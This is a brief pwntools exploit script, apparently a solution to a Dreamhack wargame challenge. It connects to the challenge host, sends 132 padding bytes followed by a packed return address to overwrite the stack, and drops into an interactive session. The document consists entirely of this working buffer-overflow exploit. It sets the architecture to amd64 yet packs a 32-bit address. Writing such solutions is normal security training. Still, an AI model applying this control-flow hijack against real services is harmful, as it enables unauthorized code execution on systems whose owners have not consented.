from pwn import *

r = remote('host3.dreamhack.games',11920)
buf_address = 0x80485b9

context.arch = "amd64"

code = b'\x80'*132
code += p32(buf_address)

r.send(code)
r.interactive()
